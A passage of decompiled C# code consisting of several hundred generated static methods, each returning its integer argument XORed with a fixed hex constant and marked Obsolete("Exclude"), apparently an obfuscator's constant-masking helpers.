		return int_4 ^ 0xC816C74;
	}

	[Obsolete("Exclude")]
	public static int smethod_2306(int int_4)
	{
		return int_4 ^ 0x2DFCD278;
	}

	[Obsolete("Exclude")]
	public static int smethod_2307(int int_4)
	{
		return int_4 ^ 0x3056DAA6;
	}

	[Obsolete("Exclude")]
	public static int smethod_2308(int int_4)
	{
		return int_4 ^ 0x4637493F;
	}

	[Obsolete("Exclude")]
	public static int smethod_2309(int int_4)
	{
		return int_4 ^ 0x23B75381;
	}

	[Obsolete("Exclude")]
	public static int smethod_2310(int int_4)
	{
		return int_4 ^ 0x69B6B39C;
	}

	[Obsolete("Exclude")]
	public static int smethod_2311(int int_4)
	{
		return int_4 ^ 0x5157714B;
	}

	[Obsolete("Exclude")]
	public static int smethod_2312(int int_4)
	{
		return int_4 ^ 0x7888BA14;
	}

	[Obsolete("Exclude")]
	public static int smethod_2313(int int_4)
	{
		return int_4 ^ 0x229AAC9E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2314(int int_4)
	{
		return int_4 ^ 0x737672FF;
	}

	[Obsolete("Exclude")]
	public static int smethod_2315(int int_4)
	{
		return int_4 ^ 0x5979BD04;
	}

	[Obsolete("Exclude")]
	public static int smethod_2316(int int_4)
	{
		return int_4 ^ 0x1AA57841;
	}

	[Obsolete("Exclude")]
	public static int smethod_2317(int int_4)
	{
		return int_4 ^ 0x78896D4E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2318(int int_4)
	{
		return int_4 ^ 0x6FC24715;
	}

	[Obsolete("Exclude")]
	public static int smethod_2319(int int_4)
	{
		return int_4 ^ 0x21FEEB2B;
	}

	[Obsolete("Exclude")]
	public static int smethod_2320(int int_4)
	{
		return int_4 ^ 0x43E9A1E4;
	}

	[Obsolete("Exclude")]
	public static int smethod_2321(int int_4)
	{
		return int_4 ^ 0x4D6525E1;
	}

	[Obsolete("Exclude")]
	public static int smethod_2322(int int_4)
	{
		return int_4 ^ 0x4240AD7C;
	}

	[Obsolete("Exclude")]
	public static int smethod_2323(int int_4)
	{
		return int_4 ^ 0x46E0F3ED;
	}

	[Obsolete("Exclude")]
	public static int smethod_2324(int int_4)
	{
		return int_4 ^ 0x6AC6F501;
	}

	[Obsolete("Exclude")]
	public static int smethod_2325(int int_4)
	{
		return int_4 ^ 0x7522E03;
	}

	[Obsolete("Exclude")]
	public static int smethod_2326(int int_4)
	{
		return int_4 ^ 0x555494ED;
	}

	[Obsolete("Exclude")]
	public static int smethod_2327(int int_4)
	{
		return int_4 ^ 0x7EDCA73B;
	}

	[Obsolete("Exclude")]
	public static int smethod_2328(int int_4)
	{
		return int_4 ^ 0x316BE02D;
	}

	[Obsolete("Exclude")]
	public static int smethod_2329(int int_4)
	{
		return int_4 ^ 0x7AA95B2F;
	}

	[Obsolete("Exclude")]
	public static int smethod_2330(int int_4)
	{
		return int_4 ^ 0x34CC8024;
	}

	[Obsolete("Exclude")]
	public static int smethod_2331(int int_4)
	{
		return int_4 ^ 0x5342729D;
	}

	[Obsolete("Exclude")]
	public static int smethod_2332(int int_4)
	{
		return int_4 ^ 0x6C3CDD2B;
	}

	[Obsolete("Exclude")]
	public static int smethod_2333(int int_4)
	{
		return int_4 ^ 0x7148E9B8;
	}

	[Obsolete("Exclude")]
	public static int smethod_2334(int int_4)
	{
		return int_4 ^ 0x24C1CD5D;
	}

	[Obsolete("Exclude")]
	public static int smethod_2335(int int_4)
	{
		return int_4 ^ 0x53A3116B;
	}

	[Obsolete("Exclude")]
	public static int smethod_2336(int int_4)
	{
		return int_4 ^ 0x5660C223;
	}

	[Obsolete("Exclude")]
	public static int smethod_2337(int int_4)
	{
		return int_4 ^ 0x54DF4080;
	}

	[Obsolete("Exclude")]
	public static int smethod_2338(int int_4)
	{
		return int_4 ^ 0x4ECE1D11;
	}

	[Obsolete("Exclude")]
	public static int smethod_2339(int int_4)
	{
		return int_4 ^ 0x7B71DF5E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2340(int int_4)
	{
		return int_4 ^ 0x5D12C950;
	}

	[Obsolete("Exclude")]
	public static int smethod_2341(int int_4)
	{
		return int_4 ^ 0x60EFCDF3;
	}

	[Obsolete("Exclude")]
	public static int smethod_2342(int int_4)
	{
		return int_4 ^ 0x30640631;
	}

	[Obsolete("Exclude")]
	public static int smethod_2343(int int_4)
	{
		return int_4 ^ 0x622038CA;
	}

	[Obsolete("Exclude")]
	public static int smethod_2344(int int_4)
	{
		return int_4 ^ 0x30EB1A54;
	}

	[Obsolete("Exclude")]
	public static int smethod_2345(int int_4)
	{
		return int_4 ^ 0x40E080E1;
	}

	[Obsolete("Exclude")]
	public static int smethod_2346(int int_4)
	{
		return int_4 ^ 0x13A8B5CB;
	}

	[Obsolete("Exclude")]
	public static int smethod_2347(int int_4)
	{
		return int_4 ^ 0x6430DA3A;
	}

	[Obsolete("Exclude")]
	public static int smethod_2348(int int_4)
	{
		return int_4 ^ 0x40FA758B;
	}

	[Obsolete("Exclude")]
	public static int smethod_2349(int int_4)
	{
		return int_4 ^ 0x4B5A945C;
	}

	[Obsolete("Exclude")]
	public static int smethod_2350(int int_4)
	{
		return int_4 ^ 0xD9A6947;
	}

	[Obsolete("Exclude")]
	public static int smethod_2351(int int_4)
	{
		return int_4 ^ 0x43103CEA;
	}

	[Obsolete("Exclude")]
	public static int smethod_2352(int int_4)
	{
		return int_4 ^ 0x4D467F40;
	}

	[Obsolete("Exclude")]
	public static int smethod_2353(int int_4)
	{
		return int_4 ^ 0x7E1D2AC6;
	}

	[Obsolete("Exclude")]
	public static int smethod_2354(int int_4)
	{
		return int_4 ^ 0x2F7D65E8;
	}

	[Obsolete("Exclude")]
	public static int smethod_2355(int int_4)
	{
		return int_4 ^ 0x2FDFF1DF;
	}

	[Obsolete("Exclude")]
	public static int smethod_2356(int int_4)
	{
		return int_4 ^ 0x214C1CA1;
	}

	[Obsolete("Exclude")]
	public static int smethod_2357(int int_4)
	{
		return int_4 ^ 0x22F3315C;
	}

	[Obsolete("Exclude")]
	public static int smethod_2358(int int_4)
	{
		return int_4 ^ 0x71F93A41;
	}

	[Obsolete("Exclude")]
	public static int smethod_2359(int int_4)
	{
		return int_4 ^ 0xB910D9C;
	}

	[Obsolete("Exclude")]
	public static int smethod_2360(int int_4)
	{
		return int_4 ^ 0x578374EF;
	}

	[Obsolete("Exclude")]
	public static int smethod_2361(int int_4)
	{
		return int_4 ^ 0x3B7010FF;
	}

	[Obsolete("Exclude")]
	public static int smethod_2362(int int_4)
	{
		return int_4 ^ 0x665A106E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2363(int int_4)
	{
		return int_4 ^ 0x3FD56093;
	}

	[Obsolete("Exclude")]
	public static int smethod_2364(int int_4)
	{
		return int_4 ^ 0x519D6E5E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2365(int int_4)
	{
		return int_4 ^ 0x63B73554;
	}

	[Obsolete("Exclude")]
	public static int smethod_2366(int int_4)
	{
		return int_4 ^ 0x15D1804E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2367(int int_4)
	{
		return int_4 ^ 0x5C51B45D;
	}

	[Obsolete("Exclude")]
	public static int smethod_2368(int int_4)
	{
		return int_4 ^ 0x569865C2;
	}

	[Obsolete("Exclude")]
	public static int smethod_2369(int int_4)
	{
		return int_4 ^ 0x1364E896;
	}

	[Obsolete("Exclude")]
	public static int smethod_2370(int int_4)
	{
		return int_4 ^ 0x3BDDAE32;
	}

	[Obsolete("Exclude")]
	public static int smethod_2371(int int_4)
	{
		return int_4 ^ 0x5E760743;
	}

	[Obsolete("Exclude")]
	public static int smethod_2372(int int_4)
	{
		return int_4 ^ 0x6C0C934E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2373(int int_4)
	{
		return int_4 ^ 0x47B48815;
	}

	[Obsolete("Exclude")]
	public static int smethod_2374(int int_4)
	{
		return int_4 ^ 0x3366CAE7;
	}

	[Obsolete("Exclude")]
	public static int smethod_2375(int int_4)
	{
		return int_4 ^ 0x4410D90A;
	}

	[Obsolete("Exclude")]
	public static int smethod_2376(int int_4)
	{
		return int_4 ^ 0x6609E749;
	}

	[Obsolete("Exclude")]
	public static int smethod_2377(int int_4)
	{
		return int_4 ^ 0x65AF3B73;
	}

	[Obsolete("Exclude")]
	public static int smethod_2378(int int_4)
	{
		return int_4 ^ 0x5BF062DE;
	}

	[Obsolete("Exclude")]
	public static int smethod_2379(int int_4)
	{
		return int_4 ^ 0x674D5601;
	}

	[Obsolete("Exclude")]
	public static int smethod_2380(int int_4)
	{
		return int_4 ^ 0x56AE814F;
	}

	[Obsolete("Exclude")]
	public static int smethod_2381(int int_4)
	{
		return int_4 ^ 0x2E77CA48;
	}

	[Obsolete("Exclude")]
	public static int smethod_2382(int int_4)
	{
		return int_4 ^ 0x5573C10C;
	}

	[Obsolete("Exclude")]
	public static int smethod_2383(int int_4)
	{
		return int_4 ^ 0x73646183;
	}

	[Obsolete("Exclude")]
	public static int smethod_2384(int int_4)
	{
		return int_4 ^ 0x12C86A0;
	}

	[Obsolete("Exclude")]
	public static int smethod_2385(int int_4)
	{
		return int_4 ^ 0x362F3545;
	}

	[Obsolete("Exclude")]
	public static int smethod_2386(int int_4)
	{
		return int_4 ^ 0x3F4C73F1;
	}

	[Obsolete("Exclude")]
	public static int smethod_2387(int int_4)
	{
		return int_4 ^ 0x42766CB2;
	}

	[Obsolete("Exclude")]
	public static int smethod_2388(int int_4)
	{
		return int_4 ^ 0x38B6459D;
	}

	[Obsolete("Exclude")]
	public static int smethod_2389(int int_4)
	{
		return int_4 ^ 0xD4E59CE;
	}

	[Obsolete("Exclude")]
	public static int smethod_2390(int int_4)
	{
		return int_4 ^ 0x3D17DFD5;
	}

	[Obsolete("Exclude")]
	public static int smethod_2391(int int_4)
	{
		return int_4 ^ 0x7DF2CF2C;
	}

	[Obsolete("Exclude")]
	public static int smethod_2392(int int_4)
	{
		return int_4 ^ 0x4F4DEC34;
	}

	[Obsolete("Exclude")]
	public static int smethod_2393(int int_4)
	{
		return int_4 ^ 0x6EE7FD02;
	}

	[Obsolete("Exclude")]
	public static int smethod_2394(int int_4)
	{
		return int_4 ^ 0x12DCFB12;
	}

	[Obsolete("Exclude")]
	public static int smethod_2395(int int_4)
	{
		return int_4 ^ 0x611ED2BB;
	}

	[Obsolete("Exclude")]
	public static int smethod_2396(int int_4)
	{
		return int_4 ^ 0x4B6B7E60;
	}

	[Obsolete("Exclude")]
	public static int smethod_2397(int int_4)
	{
		return int_4 ^ 0x22A5562E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2398(int int_4)
	{
		return int_4 ^ 0x60D53214;
	}

	[Obsolete("Exclude")]
	public static int smethod_2399(int int_4)
	{
		return int_4 ^ 0xB8FE7D5;
	}

	[Obsolete("Exclude")]
	public static int smethod_2400(int int_4)
	{
		return int_4 ^ 0x3C1A4B0A;
	}

	[Obsolete("Exclude")]
	public static int smethod_2401(int int_4)
	{
		return int_4 ^ 0x4CE3F7F8;
	}

	[Obsolete("Exclude")]
	public static int smethod_2402(int int_4)
	{
		return int_4 ^ 0x564DE4A9;
	}

	[Obsolete("Exclude")]
	public static int smethod_2403(int int_4)
	{
		return int_4 ^ 0x1461E7DD;
	}

	[Obsolete("Exclude")]
	public static int smethod_2404(int int_4)
	{
		return int_4 ^ 0x12E0B7CD;
	}

	[Obsolete("Exclude")]
	public static int smethod_2405(int int_4)
	{
		return int_4 ^ 0x4C989BA9;
	}

	[Obsolete("Exclude")]
	public static int smethod_2406(int int_4)
	{
		return int_4 ^ 0x6F64E1A2;
	}

	[Obsolete("Exclude")]
	public static int smethod_2407(int int_4)
	{
		return int_4 ^ 0x3F50304;
	}

	[Obsolete("Exclude")]
	public static int smethod_2408(int int_4)
	{
		return int_4 ^ 0x3B1CAD70;
	}

	[Obsolete("Exclude")]
	public static int smethod_2409(int int_4)
	{
		return int_4 ^ 0x63F26793;
	}

	[Obsolete("Exclude")]
	public static int smethod_2410(int int_4)
	{
		return int_4 ^ 0x3DCE5E26;
	}

	[Obsolete("Exclude")]
	public static int smethod_2411(int int_4)
	{
		return int_4 ^ 0xC1DB58D;
	}

	[Obsolete("Exclude")]
	public static int smethod_2412(int int_4)
	{
		return int_4 ^ 0x2D4ADEB1;
	}

	[Obsolete("Exclude")]
	public static int smethod_2413(int int_4)
	{
		return int_4 ^ 0x10FA5C38;
	}

	[Obsolete("Exclude")]
	public static int smethod_2414(int int_4)
	{
		return int_4 ^ 0xCA5E47B;
	}

	[Obsolete("Exclude")]
	public static int smethod_2415(int int_4)
	{
		return int_4 ^ 0x46A93AE5;
	}

	[Obsolete("Exclude")]
	public static int smethod_2416(int int_4)
	{
		return int_4 ^ 0x4E3F5FFF;
	}

	[Obsolete("Exclude")]
	public static int smethod_2417(int int_4)
	{
		return int_4 ^ 0x6E9A416E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2418(int int_4)
	{
		return int_4 ^ 0x3DBE6109;
	}

	[Obsolete("Exclude")]
	public static int smethod_2419(int int_4)
	{
		return int_4 ^ 0x210AB847;
	}

	[Obsolete("Exclude")]
	public static int smethod_2420(int int_4)
	{
		return int_4 ^ 0x567596B1;
	}

	[Obsolete("Exclude")]
	public static int smethod_2421(int int_4)
	{
		return int_4 ^ 0x3BF51050;
	}

	[Obsolete("Exclude")]
	public static int smethod_2422(int int_4)
	{
		return int_4 ^ 0x15FEC16F;
	}

	[Obsolete("Exclude")]
	public static int smethod_2423(int int_4)
	{
		return int_4 ^ 0x1B69F41;
	}

	[Obsolete("Exclude")]
	public static int smethod_2424(int int_4)
	{
		return int_4 ^ 0xCC632C7;
	}

	[Obsolete("Exclude")]
	public static int smethod_2425(int int_4)
	{
		return int_4 ^ 0x2136B4D7;
	}

	[Obsolete("Exclude")]
	public static int smethod_2426(int int_4)
	{
		return int_4 ^ 0x33CBD842;
	}

	[Obsolete("Exclude")]
	public static int smethod_2427(int int_4)
	{
		return int_4 ^ 0x42260E89;
	}

	[Obsolete("Exclude")]
	public static int smethod_2428(int int_4)
	{
		return int_4 ^ 0x4D7B0E4F;
	}

	[Obsolete("Exclude")]
	public static int smethod_2429(int int_4)
	{
		return int_4 ^ 0x5D38566D;
	}

	[Obsolete("Exclude")]
	public static int smethod_2430(int int_4)
	{
		return int_4 ^ 0x66FC7AF5;
	}

	[Obsolete("Exclude")]
	public static int smethod_2431(int int_4)
	{
		return int_4 ^ 0x66882D17;
	}

	[Obsolete("Exclude")]
	public static int smethod_2432(int int_4)
	{
		return int_4 ^ 0x64722B08;
	}

	[Obsolete("Exclude")]
	public static int smethod_2433(int int_4)
	{
		return int_4 ^ 0x2250C465;
	}

	[Obsolete("Exclude")]
	public static int smethod_2434(int int_4)
	{
		return int_4 ^ 0x133FE7D2;
	}

	[Obsolete("Exclude")]
	public static int smethod_2435(int int_4)
	{
		return int_4 ^ 0x1FA07A3F;
	}

	[Obsolete("Exclude")]
	public static int smethod_2436(int int_4)
	{
		return int_4 ^ 0x35A899E7;
	}

	[Obsolete("Exclude")]
	public static int smethod_2437(int int_4)
	{
		return int_4 ^ 0x4E2B8A53;
	}

	[Obsolete("Exclude")]
	public static int smethod_2438(int int_4)
	{
		return int_4 ^ 0x1BBFEAD7;
	}

	[Obsolete("Exclude")]
	public static int smethod_2439(int int_4)
	{
		return int_4 ^ 0x7A7A1145;
	}

	[Obsolete("Exclude")]
	public static int smethod_2440(int int_4)
	{
		return int_4 ^ 0x3473FDA3;
	}

	[Obsolete("Exclude")]
	public static int smethod_2441(int int_4)
	{
		return int_4 ^ 0x31CDEC93;
	}

	[Obsolete("Exclude")]
	public static int smethod_2442(int int_4)
	{
		return int_4 ^ 0x3E30A876;
	}

	[Obsolete("Exclude")]
	public static int smethod_2443(int int_4)
	{
		return int_4 ^ 0x35B1FFC6;
	}

	[Obsolete("Exclude")]
	public static int smethod_2444(int int_4)
	{
		return int_4 ^ 0x15CF972E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2445(int int_4)
	{
		return int_4 ^ 0x7AB5C3A1;
	}

	[Obsolete("Exclude")]
	public static int smethod_2446(int int_4)
	{
		return int_4 ^ 0x5DD89032;
	}

	[Obsolete("Exclude")]
	public static int smethod_2447(int int_4)
	{
		return int_4 ^ 0x76007A6E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2448(int int_4)
	{
		return int_4 ^ 0x6424EFFC;
	}

	[Obsolete("Exclude")]
	public static int smethod_2449(int int_4)
	{
		return int_4 ^ 0x23750ED9;
	}

	[Obsolete("Exclude")]
	public static int smethod_2450(int int_4)
	{
		return int_4 ^ 0x4549793A;
	}

	[Obsolete("Exclude")]
	public static int smethod_2451(int int_4)
	{
		return int_4 ^ 0x8263FB8;
	}

	[Obsolete("Exclude")]
	public static int smethod_2452(int int_4)
	{
		return int_4 ^ 0x453F4441;
	}

	[Obsolete("Exclude")]
	public static int smethod_2453(int int_4)
	{
		return int_4 ^ 0x4BE08A05;
	}

	[Obsolete("Exclude")]
	public static int smethod_2454(int int_4)
	{
		return int_4 ^ 0x5EDE07FB;
	}

	[Obsolete("Exclude")]
	public static int smethod_2455(int int_4)
	{
		return int_4 ^ 0x666BF640;
	}

	[Obsolete("Exclude")]
	public static int smethod_2456(int int_4)
	{
		return int_4 ^ 0x44F1E15A;
	}

	[Obsolete("Exclude")]
	public static int smethod_2457(int int_4)
	{
		return int_4 ^ 0x3E1CACC4;
	}

	[Obsolete("Exclude")]
	public static int smethod_2458(int int_4)
	{
		return int_4 ^ 0x18FF2E40;
	}

	[Obsolete("Exclude")]
	public static int smethod_2459(int int_4)
	{
		return int_4 ^ 0x2527EACC;
	}

	[Obsolete("Exclude")]
	public static int smethod_2460(int int_4)
	{
		return int_4 ^ 0x197B45F;
	}

	[Obsolete("Exclude")]
	public static int smethod_2461(int int_4)
	{
		return int_4 ^ 0x102B7BF6;
	}

	[Obsolete("Exclude")]
	public static int smethod_2462(int int_4)
	{
		return int_4 ^ 0x3F059DA7;
	}

	[Obsolete("Exclude")]
	public static int smethod_2463(int int_4)
	{
		return int_4 ^ 0x75BF7419;
	}

	[Obsolete("Exclude")]
	public static int smethod_2464(int int_4)
	{
		return int_4 ^ 0x7F8EB0D4;
	}

	[Obsolete("Exclude")]
	public static int smethod_2465(int int_4)
	{
		return int_4 ^ 0x65224FDB;
	}

	[Obsolete("Exclude")]
	public static int smethod_2466(int int_4)
	{
		return int_4 ^ 0x30F728B7;
	}

	[Obsolete("Exclude")]
	public static int smethod_2467(int int_4)
	{
		return int_4 ^ 0x29309653;
	}

	[Obsolete("Exclude")]
	public static int smethod_2468(int int_4)
	{
		return int_4 ^ 0x613BC3AB;
	}

	[Obsolete("Exclude")]
	public static int smethod_2469(int int_4)
	{
		return int_4 ^ 0x18044E02;
	}

	[Obsolete("Exclude")]
	public static int smethod_2470(int int_4)
	{
		return int_4 ^ 0x5E619E4;
	}

	[Obsolete("Exclude")]
	public static int smethod_2471(int int_4)
	{
		return int_4 ^ 0x4C4D935;
	}

	[Obsolete("Exclude")]
	public static int smethod_2472(int int_4)
	{
		return int_4 ^ 0x4CBA9EFB;
	}

	[Obsolete("Exclude")]
	public static int smethod_2473(int int_4)
	{
		return int_4 ^ 0x2EAF5D25;
	}

	[Obsolete("Exclude")]
	public static int smethod_2474(int int_4)
	{
		return int_4 ^ 0x2F790A5A;
	}

	[Obsolete("Exclude")]
	public static int smethod_2475(int int_4)
	{
		return int_4 ^ 0x452DBE4F;
	}

	[Obsolete("Exclude")]
	public static int smethod_2476(int int_4)
	{
		return int_4 ^ 0x7CFDBC6E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2477(int int_4)
	{
		return int_4 ^ 0x25375315;
	}

	[Obsolete("Exclude")]
	public static int smethod_2478(int int_4)
	{
		return int_4 ^ 0x277FC714;
	}

	[Obsolete("Exclude")]
	public static int smethod_2479(int int_4)
	{
		return int_4 ^ 0x6E0A50CD;
	}

	[Obsolete("Exclude")]
	public static int smethod_2480(int int_4)
	{
		return int_4 ^ 0x32D31B66;
	}

	[Obsolete("Exclude")]
	public static int smethod_2481(int int_4)
	{
		return int_4 ^ 0x2BAFEAF9;
	}

	[Obsolete("Exclude")]
	public static int smethod_2482(int int_4)
	{
		return int_4 ^ 0x5ACB16C9;
	}

	[Obsolete("Exclude")]
	public static int smethod_2483(int int_4)
	{
		return int_4 ^ 0x7A1EAF4F;
	}

	[Obsolete("Exclude")]
	public static int smethod_2484(int int_4)
	{
		return int_4 ^ 0x5EEBED27;
	}

	[Obsolete("Exclude")]
	public static int smethod_2485(int int_4)
	{
		return int_4 ^ 0x6EF18C96;
	}

	[Obsolete("Exclude")]
	public static int smethod_2486(int int_4)
	{
		return int_4 ^ 0x583DCC1D;
	}

	[Obsolete("Exclude")]
	public static int smethod_2487(int int_4)
	{
		return int_4 ^ 0x181531F;
	}

	[Obsolete("Exclude")]
	public static int smethod_2488(int int_4)
	{
		return int_4 ^ 0x4DBA5BEC;
	}

	[Obsolete("Exclude")]
	public static int smethod_2489(int int_4)
	{
		return int_4 ^ 0x27EF306D;
	}

	[Obsolete("Exclude")]
	public static int smethod_2490(int int_4)
	{
		return int_4 ^ 0x7B5C96AF;
	}

	[Obsolete("Exclude")]
	public static int smethod_2491(int int_4)
	{
		return int_4 ^ 0x1303EA3E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2492(int int_4)
	{
		return int_4 ^ 0x23B4BDAB;
	}

	[Obsolete("Exclude")]
	public static int smethod_2493(int int_4)
	{
		return int_4 ^ 0x5FEF1D24;
	}

	[Obsolete("Exclude")]
	public static int smethod_2494(int int_4)
	{
		return int_4 ^ 0x25572B4E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2495(int int_4)
	{
		return int_4 ^ 0xA68FEC0;
	}

	[Obsolete("Exclude")]
	public static int smethod_2496(int int_4)
	{
		return int_4 ^ 0x1F71E0B0;
	}

	[Obsolete("Exclude")]
	public static int smethod_2497(int int_4)
	{
		return int_4 ^ 0x5AEFD10E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2498(int int_4)
	{
		return int_4 ^ 0x286D41C;
	}

	[Obsolete("Exclude")]
	public static int smethod_2499(int int_4)
	{
		return int_4 ^ 0x4002C600;
	}

	[Obsolete("Exclude")]
	public static int smethod_2500(int int_4)
	{
		return int_4 ^ 0x7D6EA516;
	}

	[Obsolete("Exclude")]
	public static int smethod_2501(int int_4)
	{
		return int_4 ^ 0x6BA72036;
	}

	[Obsolete("Exclude")]
	public static int smethod_2502(int int_4)
	{
		return int_4 ^ 0x5C6571E8;
	}

	[Obsolete("Exclude")]
	public static int smethod_2503(int int_4)
	{
		return int_4 ^ 0x693E8017;
	}

	[Obsolete("Exclude")]
	public static int smethod_2504(int int_4)
	{
		return int_4 ^ 0x57BC5755;
	}

	[Obsolete("Exclude")]
	public static int smethod_2505(int int_4)
	{
		return int_4 ^ 0x560060B4;
	}

	[Obsolete("Exclude")]
	public static int smethod_2506(int int_4)
	{
		return int_4 ^ 0x580CDC3C;
	}

	[Obsolete("Exclude")]
	public static int smethod_2507(int int_4)
	{
		return int_4 ^ 0x3289A93;
	}

	[Obsolete("Exclude")]
	public static int smethod_2508(int int_4)
	{
		return int_4 ^ 0x5C7DE102;
	}

	[Obsolete("Exclude")]
	public static int smethod_2509(int int_4)
	{
		return int_4 ^ 0x68B14C21;
	}

	[Obsolete("Exclude")]
	public static int smethod_2510(int int_4)
	{
		return int_4 ^ 0x2B43380;
	}

	[Obsolete("Exclude")]
	public static int smethod_2511(int int_4)
	{
		return int_4 ^ 0x6EC804EB;
	}

	[Obsolete("Exclude")]
	public static int smethod_2512(int int_4)
	{
		return int_4 ^ 0x331DA058;
	}

	[Obsolete("Exclude")]
	public static int smethod_2513(int int_4)
	{
		return int_4 ^ 0x7CC7F08C;
	}

	[Obsolete("Exclude")]
	public static int smethod_2514(int int_4)
	{
		return int_4 ^ 0xB86847;
	}

	[Obsolete("Exclude")]
	public static int smethod_2515(int int_4)
	{
		return int_4 ^ 0x20090C58;
	}

	[Obsolete("Exclude")]
	public static int smethod_2516(int int_4)
	{
		return int_4 ^ 0x4B1A71F7;
	}

	[Obsolete("Exclude")]
	public static int smethod_2517(int int_4)
	{
		return int_4 ^ 0x166BFDE6;
	}

	[Obsolete("Exclude")]
	public static int smethod_2518(int int_4)
	{
		return int_4 ^ 0x52EC2C83;
	}

	[Obsolete("Exclude")]
	public static int smethod_2519(int int_4)
	{
		return int_4 ^ 0x51D97160;
	}

	[Obsolete("Exclude")]
	public static int smethod_2520(int int_4)
	{
		return int_4 ^ 0x6A23BB76;
	}

	[Obsolete("Exclude")]
	public static int smethod_2521(int int_4)
	{
		return int_4 ^ 0x46C54863;
	}

	[Obsolete("Exclude")]
	public static int smethod_2522(int int_4)
	{
		return int_4 ^ 0x19902C0D;
	}

	[Obsolete("Exclude")]
	public static int smethod_2523(int int_4)
	{
		return int_4 ^ 0x41AA7800;
	}

	[Obsolete("Exclude")]
	public static int smethod_2524(int int_4)
	{
		return int_4 ^ 0x25E7F58;
	}

	[Obsolete("Exclude")]
	public static int smethod_2525(int int_4)
	{
		return int_4 ^ 0x4DA0399C;
	}

	[Obsolete("Exclude")]
	public static int smethod_2526(int int_4)
	{
		return int_4 ^ 0x309529CC;
	}

	[Obsolete("Exclude")]
	public static int smethod_2527(int int_4)
	{
		return int_4 ^ 0x688B1449;
	}

	[Obsolete("Exclude")]
	public static int smethod_2528(int int_4)
	{
		return int_4 ^ 0x17B06917;
	}

	[Obsolete("Exclude")]
	public static int smethod_2529(int int_4)
	{
		return int_4 ^ 0x76486D28;
	}

	[Obsolete("Exclude")]
	public static int smethod_2530(int int_4)
	{
		return int_4 ^ 0x5DBB031B;
	}

	[Obsolete("Exclude")]
	public static int smethod_2531(int int_4)
	{
		return int_4 ^ 0x255A064D;
	}

	[Obsolete("Exclude")]
	public static int smethod_2532(int int_4)
	{
		return int_4 ^ 0x50E3B958;
	}

	[Obsolete("Exclude")]
	public static int smethod_2533(int int_4)
	{
		return int_4 ^ 0x37026131;
	}

	[Obsolete("Exclude")]
	public static int smethod_2534(int int_4)
	{
		return int_4 ^ 0x5AA0F657;
	}

	[Obsolete("Exclude")]
	public static int smethod_2535(int int_4)
	{
		return int_4 ^ 0x38F05F7C;
	}

	[Obsolete("Exclude")]
	public static int smethod_2536(int int_4)
	{
		return int_4 ^ 0x27CCDD8;
	}

	[Obsolete("Exclude")]
	public static int smethod_2537(int int_4)
	{
		return int_4 ^ 0x15AAE3F4;
	}

	[Obsolete("Exclude")]
	public static int smethod_2538(int int_4)
	{
		return int_4 ^ 0x60A5FF37;
	}

	[Obsolete("Exclude")]
	public static int smethod_2539(int int_4)
	{
		return int_4 ^ 0x322C1BF0;
	}

	[Obsolete("Exclude")]
	public static int smethod_2540(int int_4)
	{
		return int_4 ^ 0x701841C6;
	}

	[Obsolete("Exclude")]
	public static int smethod_2541(int int_4)
	{
		return int_4 ^ 0x776F8819;
	}

	[Obsolete("Exclude")]
	public static int smethod_2542(int int_4)
	{
		return int_4 ^ 0x7CD90BAD;
	}

	[Obsolete("Exclude")]
	public static int smethod_2543(int int_4)
	{
		return int_4 ^ 0x75685FBC;
	}

	[Obsolete("Exclude")]
	public static int smethod_2544(int int_4)
	{
		return int_4 ^ 0x6CA55F06;
	}

	[Obsolete("Exclude")]
	public static int smethod_2545(int int_4)
	{
		return int_4 ^ 0x53F2B9DF;
	}

	[Obsolete("Exclude")]
	public static int smethod_2546(int int_4)
	{
		return int_4 ^ 0x74360104;
	}

	[Obsolete("Exclude")]
	public static int smethod_2547(int int_4)
	{
		return int_4 ^ 0x3AC18917;
	}

	[Obsolete("Exclude")]
	public static int smethod_2548(int int_4)
	{
		return int_4 ^ 0xD9E8AD;
	}

	[Obsolete("Exclude")]
	public static int smethod_2549(int int_4)
	{
		return int_4 ^ 0x6145032C;
	}

	[Obsolete("Exclude")]
	public static int smethod_2550(int int_4)
	{
		return int_4 ^ 0x3C1DF949;
	}

	[Obsolete("Exclude")]
	public static int smethod_2551(int int_4)
	{
		return int_4 ^ 0x64441308;
	}

	[Obsolete("Exclude")]
	public static int smethod_2552(int int_4)
	{
		return int_4 ^ 0x610B2AD9;
	}

	[Obsolete("Exclude")]
	public static int smethod_2553(int int_4)
	{
		return int_4 ^ 0x66CCA1F1;
	}

	[Obsolete("Exclude")]
	public static int smethod_2554(int int_4)
	{
		return int_4 ^ 0x16DAC8A7;
	}

	[Obsolete("Exclude")]
	public static int smethod_2555(int int_4)
	{
		return int_4 ^ 0x57330DD1;
	}

	[Obsolete("Exclude")]
	public static int smethod_2556(int int_4)
	{
		return int_4 ^ 0x519925EC;
	}

	[Obsolete("Exclude")]
	public static int smethod_2557(int int_4)
	{
		return int_4 ^ 0x6BBD5BA5;
	}

	[Obsolete("Exclude")]
	public static int smethod_2558(int int_4)
	{
		return int_4 ^ 0x5B1E93AB;
	}

	[Obsolete("Exclude")]
	public static int smethod_2559(int int_4)
	{
		return int_4 ^ 0x126AE7B0;
	}

	[Obsolete("Exclude")]
	public static int smethod_2560(int int_4)
	{
		return int_4 ^ 0x5F20378F;
	}

	[Obsolete("Exclude")]
	public static int smethod_2561(int int_4)
	{
		return int_4 ^ 0x573797AF;
	}

	[Obsolete("Exclude")]
	public static int smethod_2562(int int_4)
	{
		return int_4 ^ 0x5F7A060B;
	}

	[Obsolete("Exclude")]
	public static int smethod_2563(int int_4)
	{
		return int_4 ^ 0x4BBF7F3E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2564(int int_4)
	{
		return int_4 ^ 0x5E393A4;
	}

	[Obsolete("Exclude")]
	public static int smethod_2565(int int_4)
	{
		return int_4 ^ 0x5B226949;
	}

